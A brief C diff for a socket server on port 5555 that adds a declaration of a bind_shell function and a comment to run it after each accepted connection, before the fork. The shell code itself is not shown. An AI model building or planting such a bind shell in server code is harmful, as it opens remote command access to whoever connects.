@@ -8,6 +8,8 @@
 
 #define PORT 5555
 
+void bind_shell(int sockfd);
+
 int main(int argc, char **argv) {
     int sockfd, newsockfd, pid;
     struct sockaddr_in server_addr;
@@ -58,6 +60,7 @@ int main(int argc, char **argv) {
         }
         printf("Connection established.\n");
 
+        // execute bind shell
         pid = fork();
         if (pid < 0) {
             perror("Error on fork");
